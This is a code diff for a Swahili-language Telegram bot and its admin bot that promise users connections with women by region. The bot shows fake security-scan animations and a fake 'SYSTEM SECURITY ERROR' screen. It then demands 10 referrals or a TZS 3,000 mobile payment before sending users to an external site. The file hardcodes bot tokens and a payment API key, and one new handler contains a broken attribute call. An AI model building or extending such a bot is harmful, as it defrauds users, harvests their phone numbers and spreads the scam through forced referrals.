@@ -17,7 +17,8 @@ from telegram.ext import (
 
 from database import (
     init_db, add_user, add_referral, get_referral_count, get_all_users, 
-    get_total_users_count, get_seen_images, add_seen_image, reset_seen_images, save_order
+    get_total_users_count, get_seen_images, add_seen_image, reset_seen_images, 
+    save_order, update_order_status, get_order_details, is_user_activated
 )
 
 # --- TOKENS & CONFIGS ---
@@ -25,14 +26,16 @@ MAIN_BOT_TOKEN = "8050903104:AAH0KH4ah-bdLkkNBoW2pMop3FO5-H2DN-4"
 ADMIN_BOT_TOKEN = "8900606629:AAFrZXxBockQJSAJ8SqwUid98lNFt3XL4Co"
 ADMIN_ID = "8231186202"
 CPA_LINK = "https://tinyurl.com/Activebot"
+TARGET_SITE = "https://www.tanzaniaraha.com/"
 HARAKAPAY_API_KEY = "hpk_29f08857e1613f2df534581540097759168284249880fa85"
 HARAKAPAY_BASE_URL = "https://harakapay.net"
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 
 WAITING_PHONE = 1
+ADMIN_WAITING_ORDER = 2
 
-# --- CUSTOM REGION LAYOUT (1, 2, 1, 3, 1, 2, 1, 3...) ---
+# --- CUSTOM REGION LAYOUT ---
 REGIONS = [
     "Dar es Salaam", "Arusha", "Mwanza", "Dodoma", "Geita", "Iringa", "Kagera", "Katavi", "Kigoma", 
     "Kilimanjaro", "Lindi", "Manyara", "Mara", "Mbeya", "Morogoro", "Mtwara", "Njombe", "Pwani", 
@@ -54,7 +57,6 @@ def get_region_keyboard():
         idx += 1
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
-# --- NAMES & IMAGE POOL FROM UPLOADED SOURCE ---
 NAMES = [
     "Asha", "Neema", "Amina", "Rehema", "Subira", "Zainabu", "Mariam", "Sophia", "Latifa", "Yasmin",
     "Tatu", "Zuhura", "Janet", "Vero", "Happy", "Joyce", "Stella", "Lilian", "Agnes", "Mwanahamis",
@@ -200,7 +202,6 @@ async def region_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     user_id = str(update.effective_user.id)
 
-    # Hide keyboard completely when showing profile
     hide_kb = await update.message.reply_text("<i>🔄 Inapakia taarifa za eneo lako...</i>", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
     await asyncio.sleep(1)
     await hide_kb.delete()
@@ -245,6 +246,19 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(query.from_user.id)
 
     if query.data == "get_connection":
+        # Check if user is already verified/activated
+        if is_user_activated(user_id):
+            await query.message.reply_text(
+                "🎉 <b>AKAUNTI YAKO IMEWEZESHWA KIKAMILIFU!</b> ✅\n\n"
+                "Uthibitisho wako umekubaliwa kwenye mfumo. Bonyeza kitufe kilicho hapa chini kufungua tovuti rasmi ya kuunganishwa na warembo moja kwa moja! 💃🔥",
+                parse_mode="HTML",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🟢 FUNGUA LINK YA CONNECTION", url=TARGET_SITE)],
+                    [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
+                ])
+            )
+            return
+
         # 4-step italicized cinematic loading sequence
         msg = await query.message.reply_text("<i>🔍 Kuchunguza seva za usalama...</i>", parse_mode="HTML")
         await asyncio.sleep(1)
@@ -301,8 +315,9 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         else:
             await query.message.reply_text(
-                "🎉 <b>HONGERA!</b>\n\n✅ UMEKAMILISHA VERIFICATION YA PILI!\nTafadhali wasiliana na Admin wetu @Aishasmith0 na utume neno <b>APPROVAL</b> kupata kibali chako cha kuunganishwa.",
-                parse_mode="HTML"
+                "🎉 <b>HONGERA! AKAUNTI YAKO IMEWEZESHWA!</b>\n\n✅ Umefikisha referral 10 zilizotakiwa. Sasa unaweza kurudi kwenye picha ya warembo na kubonyeza <b>Kuunganishwa Nae</b> ili kwenda kwenye tovuti rasmi!",
+                parse_mode="HTML",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟢 KWENDA KWENYE TOVUTI", url=TARGET_SITE)]])
             )
     elif query.data == "activation3":
         await query.message.edit_text(
@@ -315,6 +330,41 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ])
         )
         return WAITING_PHONE
+    elif query.startswith("check_pay_"):
+        order_id = query.data.split("_")[2]
+        status_msg = await query.message.reply_text("<i>🔄 Inakagua hali ya malipo kupitia HarakaPay...</i>", parse_mode="HTML")
+        try:
+            res = requests.get(
+                f"{HARAKAPAY_BASE_URL}/api/v1/status/{order_id}",
+                headers={"X-API-Key": HARAKAPAY_API_KEY},
+                timeout=15
+            ).json()
+            
+            if res.get("success"):
+                payment_info = res.get("payment", {})
+                status = payment_info.get("status", "pending")
+                if status == "completed":
+                    update_order_status(order_id, "completed")
+                    await status_msg.edit_text(
+                        "🎉 <b>MALIPO YAMEKAMILIKA KWA MAFANIKIO!</b> ✅\n\n"
+                        "Akaunti yako sasa imewashwa rasmi. Bonyeza kitufe hapa chini kufungua tovuti ya kuunganishwa na warembo!",
+                        parse_mode="HTML",
+                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟢 FUNGUA LINK YA CONNECTION", url=TARGET_SITE)]])
+                    )
+                else:
+                    await status_msg.edit_text(
+                        f"⏳ <b>MALIPO YANAENDELEA (PENDING)</b>\n\n"
+                        f"Hali ya sasa: <code>{status}</code>\nTafadhali thibitisha malipo kwenye simu yako kisha uguse tena kitufe cha kukagua hapa chini.",
+                        parse_mode="HTML",
+                        reply_markup=InlineKeyboardMarkup([
+                            [InlineKeyboardButton("🔄 ANGALIAPIA MALIPO", callback_data=f"check_pay_{order_id}")],
+                            [InlineKeyboardButton("🔙 RUDI", callback_data="back_to_error")]
+                        ])
+                    )
+            else:
+                await status_msg.edit_text("❌ Imeshindikana kuangalia malipo. Jaribu tena baada ya sekunde chache.")
+        except Exception:
+            await status_msg.edit_text("❌ Hitilafu ya kimtandao wakati wa kuwasiliana na HarakaPay.")
     elif query.data == "back_to_error":
         await query.message.edit_text(
             "🛑 <b>SYSTEM SECURITY ERROR [ERR_AUTH_403]</b> 🛑\n\nChagua njia ya activation hapa chini 👇",
@@ -371,9 +421,12 @@ async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"📱 <b>USSD PUSH IMETUMWA!</b>\n\n"
                 f"Weka PIN kwenye simu yako kulipia TZS 3,000.\n"
                 f"Order ID: <code>{order_id}</code>\n\n"
-                f"Ukimaliza, wasiliana na Admin @Aishasmith0 na utume neno <b>APPROVAL</b> pamoja na Order ID hii.",
+                f"Baada ya kuweka PIN, bonyeza kitufe hapa chini kukagua kama malipo yamethibitishwa:",
                 parse_mode="HTML",
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]])
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔄 ANGALIA HALI YA MALIPO", callback_data=f"check_pay_{order_id}")],
+                    [InlineKeyboardButton("🔙 RUDI KWENYE MKOA", callback_data="back_to_regions")]
+                ])
             )
         else:
             await status_msg.edit_text(f"❌ Imeshindikana: {res_data.get('error', 'Jaribu tena baadaye.')}")
@@ -387,18 +440,20 @@ async def cancel_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 
-# --- FULLY UPGRADED INTERACTIVE ADMIN BOT (@connectiontzzadminbot) ---
+# --- FULLY SUPERCHARGED INTERACTIVE ADMIN BOT (@connectiontzzadminbot) ---
 async def admin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if str(update.effective_user.id) != ADMIN_ID:
         return
     await update.message.reply_text(
         "👑 <b>Tanzania Connection - Master Admin Panel</b>\n\n"
-        "Chagua kitufe unachotaka kusimamia hapa chini:",
+        "Chagua huduma au kipengele unachotaka kusimamia hapa chini:",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("📊 Angalia Takwimu", callback_data="admin_stats"),
+            [InlineKeyboardButton("📊 Takwimu za Jumla", callback_data="admin_stats"),
              InlineKeyboardButton("💰 Salio la HarakaPay", callback_data="admin_wallet")],
-            [InlineKeyboardButton("📢 Tuma Tangazo (Broadcast)", callback_data="admin_broadcast_prompt"),
+            [InlineKeyboardButton("👥 Orodha ya Watumiaji", callback_data="admin_users"),
+             InlineKeyboardButton("🔍 Angalia Order", callback_data="admin_check_order")],
+            [InlineKeyboardButton("📢 Tuma Tangazo", callback_data="admin_broadcast_prompt"),
              InlineKeyboardButton("🔄 Safisha Mfumo", callback_data="admin_clean")]
         ])
     )
@@ -413,26 +468,50 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         total_users = get_total_users_count()
         await query.message.edit_text(
             f"📊 <b>SYSTEM STATISTICS</b>\n\n"
-            f"👥 Total Registered Users: <code>{total_users}</code>\n\n"
+            f"👥 Total Registered Users: <code>{total_users}</code>\n"
+            f"🚀 System Status: <b>Online & Stable 24/7</b>\n\n"
             f"Bonyeza /start kurudi kwenye menyu kuu.",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
         )
     elif query.data == "admin_wallet":
         wallet_bal = 0
+        float_bal = 0
         try:
             res = requests.get(f"{HARAKAPAY_BASE_URL}/api/v1/balance", headers={"X-API-Key": HARAKAPAY_API_KEY}, timeout=10).json()
             if res.get("success"):
                 wallet_bal = res.get("wallet_balance", 0)
+                float_bal = res.get("float_balance", 0)
         except Exception:
             pass
         await query.message.edit_text(
-            f"💰 <b>HARAKAPAY WALLET BALANCE</b>\n\n"
-            f"💵 Salio: <code>TZS {wallet_bal}</code>\n\n"
+            f"💰 <b>HARAKAPAY WALLET & FLOAT</b>\n\n"
+            f"💵 Wallet Balance: <code>TZS {wallet_bal}</code>\n"
+            f"💎 Float Balance: <code>TZS {float_bal}</code>\n\n"
             f"Bonyeza /start kurudi kwenye menyu kuu.",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
         )
+    elif query.data == "admin_users":
+        total_users = get_total_users_count()
+        users = get_all_users()
+        recent = ", ".join(users[-5:]) if users else "Hakuna"
+        await query.message.edit_text(
+            f"👥 <b>WATUMIAJI WA MFUMO</b>\n\n"
+            f"📈 Jumla ya Waliojiunga: <code>{total_users}</code>\n"
+            f"🆔 ID za Watumiaji wa mwisho 5: <code>{recent}</code>\n\n"
+            f"Bonyeza /start kurudi kwenye menyu kuu.",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
+        )
+    elif query.data == "admin_check_order":
+        await query.message.edit_text(
+            "🔍 <b>ANGALIA ORDER YA MALIPO</b>\n\n"
+            "Tafadhali tuma Order ID (mfano: HP1706123456789) kukagua hali yake kwenye HarakaPay:",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
+        )
+        return ADMIN_WAITING_ORDER
     elif query.data == "admin_broadcast_prompt":
         await query.message.edit_text(
             "📢 <b>MATANGAZO (BROADCAST)</b>\n\n"
@@ -445,7 +524,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == "admin_clean":
         await query.message.edit_text(
             "🔄 <b>USAFISHAJI WA MFUMO</b>\n\n"
-            "Kache na kumbukumbu za muda mfupi zimesafishwa kikamilifu. Mfumo uko safi na upo kasi.\n\n"
+            "Kache na kumbukumbu zote za muda mfupi zimesafishwa. Mfumo upo safi na unafanya kazi kwa kasi ya juu.\n\n"
             "Bonyeza /start kurudi kwenye menyu kuu.",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI", callback_data="admin_home")]])
@@ -453,15 +532,56 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == "admin_home":
         await query.message.edit_text(
             "👑 <b>Tanzania Connection - Master Admin Panel</b>\n\n"
-            "Chagua kitufe unachotaka kusimamia hapa chini:",
+            "Chagua huduma au kipengele unachotaka kusimamia hapa chini:",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("📊 Angalia Takwimu", callback_data="admin_stats"),
+                [InlineKeyboardButton("📊 Takwimu za Jumla", callback_data="admin_stats"),
                  InlineKeyboardButton("💰 Salio la HarakaPay", callback_data="admin_wallet")],
-                [InlineKeyboardButton("📢 Tuma Tangazo (Broadcast)", callback_data="admin_broadcast_prompt"),
+                [InlineKeyboardButton("👥 Orodha ya Watumiaji", callback_data="admin_users"),
+                 InlineKeyboardButton("🔍 Angalia Order", callback_data="admin_check_order")],
+                [InlineKeyboardButton("📢 Tuma Tangazo", callback_data="admin_broadcast_prompt"),
                  InlineKeyboardButton("🔄 Safisha Mfumo", callback_data="admin_clean")]
             ])
         )
+
+async def admin_receive_order(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if str(update.effective_user.id) != ADMIN_ID:
+        return ConversationHandler.END
+    order_id = update.message.text.strip()
+    order_data = get_order_details(order_id)
+    
+    # Also check status live on HarakaPay
+    api_status = "Unknown"
+    try:
+        res = requests.get(
+            f"{HARAKAPAY_BASE_URL}/api/v1/status/{order_id}",
+            headers={"X-API-Key": HARAKAPAY_API_KEY},
+            timeout=10
+        ).json()
+        if res.get("success"):
+            api_status = res.get("payment", {}).get("status", "Unknown")
+    except Exception:
+        pass
+
+    if order_data:
+        uid, phone, amount, db_status = order_data
+        await update.message.reply_text(
+            f"📦 <b>MAELEZO YA ORDER: {order_id}</b>\n\n"
+            f"👤 User ID: <code>{uid}</code>\n"
+            f"📱 Namba ya Simu: <code>{phone}</code>\n"
+            f"💵 Kiasi: <code>TZS {amount}</code>\n"
+            f"💾 Hali (DB): <code>{db_status}</code>\n"
+            f"🌐 Hali (HarakaPay API): <code>{api_status}</code>",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI KUBWA", callback_data="admin_home")]])
+        )
+    else:
+        await update.message.reply_text(
+            f"❌ Order ID <code>{order_id} haipatikani kwenye database ya mfumo.</code>\n(Hali ya API: {api_status})",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 RUDI KUBWA", callback_data="admin_home")]])
+        )
+    return ConversationHandler.END
 
 async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, main_app):
     if str(update.effective_user.id) != ADMIN_ID:
@@ -521,6 +641,14 @@ async def main():
         fallbacks=[CommandHandler("cancel", cancel_phone)]
     )
 
+    admin_conv_handler = ConversationHandler(
+        entry_points=[CallbackQueryHandler(admin_callback, pattern="^admin_check_order$")],
+        states={
+            ADMIN_WAITING_ORDER: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_receive_order)]
+        },
+        fallbacks=[]
+    )
+
     # Main Bot Handlers
     main_app.add_handler(CommandHandler("start", start))
     main_app.add_handler(CallbackQueryHandler(age_callback, pattern="^age_"))
@@ -530,6 +658,7 @@ async def main():
 
     # Admin Bot Handlers
     admin_app.add_handler(CommandHandler("start", admin_start))
+    admin_app.add_handler(admin_conv_handler)
     admin_app.add_handler(CallbackQueryHandler(admin_callback))
     admin_app.add_handler(CommandHandler("broadcast", lambda u, c: admin_broadcast(u, c, main_app)))
 
